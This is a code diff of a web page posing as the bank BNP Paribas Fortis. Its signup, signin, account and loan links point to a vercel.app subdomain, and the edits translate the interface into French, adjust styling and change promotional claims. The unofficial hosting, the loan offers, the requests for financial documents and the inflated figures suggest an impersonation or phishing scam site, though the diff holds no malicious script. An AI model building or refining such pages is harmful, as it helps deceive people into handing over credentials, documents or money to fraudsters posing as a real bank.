@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="fr-FR" >
 
 <head>
   <meta charset="UTF-8">
@@ -42,7 +42,7 @@ z-index: 999;
 top: 80px;
    padding: 20px 0px;
   
-     display:flex;
+     display:none;
      background:whitesmoke;
      flex-direction: column;
    
@@ -56,7 +56,7 @@ top: 80px;
 .list-drl li{
   
   list-style: none;
- 
+ width: 363px;
   margin: 20px 0px;
 }
 .list-drl li a{
@@ -67,6 +67,7 @@ padding: 10px 120px;
 margin: 20px 0px;
 background: white;
 background: white;
+width: 363px;
 color: seagreen;
 border-radius: 8px;
 text-align: center;
@@ -77,7 +78,7 @@ font-size: 20px;
   padding: 10px 120px;
   margin: 20px 0px;
   background: white;
-  
+  width:;
   border-radius: 4px;
   background: seagreen;
   color: whitesmoke;
@@ -100,7 +101,8 @@ font-size: 20px;
    .menu-nav div{
    
  
-   width:50px;
+   
+   
    padding: 5px 20px;
      margin: 30px;
      font-size: 20px;
@@ -738,9 +740,11 @@ position: relative;
    <meta name="google-site-verification" content="3BbG4tgkFljCt0A7dT7CIfzjYjFjkOVSDZRiKn8iRHQ" />
 </head>
 
-<body id="google_translate_element">
+<body >
  
-    
+ 
+
+
  
   <div class="menu">
   <div class="list-drl">
@@ -749,18 +753,18 @@ position: relative;
     
        </div>
        <div class="list-item">
-         <li><a href="https://bnpparibas-gfrz.vercel.app/signup ">Signup</a></li>
+         <li><a href="https://bnpparibas-gfrz.vercel.app/signup ">Se connecter</a></li>
        </div>
        <div class="list-item">
-         <li><a href="https://bnpparibas-gfrz.vercel.app/ssignin">SignIn</a></li>
+         <li><a href="https://bnpparibas-gfrz.vercel.app/signin">S'inscrire</a></li>
        </div>
     
     
     <div class="list-item">
-         <li><a href="https://bnpparibas-gfrz.vercel.app/account">BankAccount</a></li>
+         <li><a href="https://bnpparibas-gfrz.vercel.app/account">Account</a></li>
        </div>
     <div class="list-item">
-   <li><a href="https://bnpparibas-gfrz.vercel.app/loan">Prêt</a></li>
+   <li><a href="https://bnpparibas-gfrz.vercel.app/loan">Prêt d'Argent</a></li>
    
      
        
@@ -774,7 +778,9 @@ position: relative;
        
      
   <div class="imgbank">
+  <div id="google_translate_element">
   
+  </div>
       <h1>BNP Paribas Fortis</h1>
        
         
@@ -802,7 +808,7 @@ position: relative;
           More payement option Better than Cash
         </h2>
         <div class="payment-text">
-        Nous participons à la réduction de vos pertes financiers en vous conseillant d'utiliser les cartes bancaires pour vos transaction au lieu des billets en mains en cas de vol ou d'autres types d'inconvénient d'avoir une traçabilité de vos différents types de transaction pour mieux situer lors d'une opération frauduleuse.
+        Nous participons à la réduction de vos pertes financières en vous conseillant d'utiliser les cartes bancaires pour vos transaction au lieu des billets en mains en cas de vol ou d'autres types d'inconvénient d'avoir une traçabilité de vos différents types de transaction pour mieux situer lors d'une opération frauduleuse.
         </div>
         <div class="payment-img-raise">
          <h2>BNP PARIBAS FORTIS Followers</h2>
@@ -944,13 +950,13 @@ position: relative;
      <div class="">
        <h2>Balance Account</h2>
        <div class="pymt-text">
-         La palette de la banque BNP PARIBAS FORTIS s'étend jusqu'à 880.000€ de capitaux mise au service de nos partenaires pour satisfaire la réalisation entrepreneuriale.
+         La palette de la banque BNP PARIBAS FORTIS s'étend jusqu'à 1000000.000€ de capitaux mise au service de nos partenaires pour satisfaire la réalisation entrepreneuriale.
        </div>
      </div>
      <div>
        <h2>Virement</h2>
        <div class="pymt-text">
-         Nous assurons la fluidité de notre système bancaire par un moyen de transfert plus rapide sans perdre de temps au à nos clients en adoptant les virements instantané qui ne dure que quelques minutes pour transfert d'un compte à autre.
+         Nous assurons la fluidité de notre système bancaire par un moyen de transfert plus rapide sans perdre de temps à nos clients en adoptant les virements instantanés qui ne durent que quelques minutes pour transfert d'un compte à autre.
        </div>
      </div>
      <div>
@@ -987,7 +993,8 @@ position: relative;
          Un livret de paiement ou une photo du livret pour les demandes en ligne pour justifier vos situations financières.
        </div>
        <div class="imgpymt">
-         VISA Ouvrir un compte
+         <a style="text-decoration: none;color: white"  href="">VISA Ouvrir un compte</a>
+         
  
        </div>
      </div>
@@ -995,7 +1002,14 @@ position: relative;
  
    </div>
   </div>
+  <script type="text/javascript">
+   function googleTranslateElementInit() {
+   new google.translate.TranslateElement({pageLanguage: 'en-US'}, 'google_translate_element');
+   }
+   console.log(navigator.language)
+   </script>
    
+   <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
   <script type="text/javascript">
 let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""}
     const list= document.getElementById('hover-list')
@@ -1016,28 +1030,20 @@ let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""
       if(listOpe){
         listDeroulante[0].style.top = '80px'
         listDeroulante[0].style.opacity = 1
-        
+        listDeroulante[0].style.display='flex'
         listOpe=false
       }
       else{
         listDeroulante[0].style.top = '65px'
         listDeroulante[0].style.opacity = 0
-      
+      listDeroulante[0].style.display='none'
         listOpe=true
       }
     
     })
    
 
-
-  
-  </script>
-  <script type="text/javascript">
-function googleTranslateElementInit() { new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
-}
 </script>
-<script type="text/javascript" src="//translate.google.com/translate_a/element.js? cb=googleTranslateElementInit"></script>
-
   <footer>
   All right reserved ©2024
  
